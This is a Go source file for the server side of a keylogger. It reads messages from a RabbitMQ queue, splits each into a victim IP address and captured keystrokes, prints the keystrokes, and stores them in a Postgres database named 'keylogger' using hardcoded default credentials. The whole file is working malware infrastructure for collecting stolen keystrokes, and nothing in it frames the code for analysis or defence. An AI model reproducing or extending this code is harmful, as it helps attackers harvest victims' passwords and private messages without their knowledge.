package main

import (
	"database/sql"
	"fmt"
	"log"
	"os"
	"strings"

	_ "github.com/lib/pq"
	"github.com/streadway/amqp"
)

const (
	host     = "localhost"
	port     = 5432
	user     = "postgres"
	password = "password"
	dbname   = "keylogger"
)

func main() {
	// Store captured keystrokes in database
	psqlconn := fmt.Sprintf("host=%s port=%d user=%s password=%s dbname=%s sslmode=disable",
		host, port, user, password, dbname)
	db, err := sql.Open("postgres", psqlconn)
	if err != nil {
		log.Fatalf("Error connecting to database: %v\n", err)
	}
	defer db.Close()
	err = db.Ping()
	if err != nil {
		log.Fatalf("Error connecting to database: %v\n", err)
	}
	log.Println("Connected to database")

	// Receive keystrokes
	amqpConn, err := amqp.Dial(os.Getenv("RABBITMQ_URI"))
	if err != nil {
		log.Fatal(err)
	}
	defer amqpConn.Close()
	channelAmqp, _ := amqpConn.Channel()
	forever := make(chan bool)
	msgs, _ := channelAmqp.Consume(
		os.Getenv("RABBITMQ_QUEUE"),
		"",
		true,
		false,
		false,
		false,
		nil,
	)

	go func() {
		for d := range msgs {
			msg := strings.Split(string(d.Body), ":")
			ip, keystrokes := msg[0], msg[1]
			log.Printf("Received a message: %s", keystrokes)
			db.Query("INSERT into recordings(ip_address, time_stamp, keystrokes) VALUES($1, $2, $3);",
				ip, d.Timestamp, keystrokes)
		}
	}()

	log.Printf("Waiting for messages")
	<-forever
}
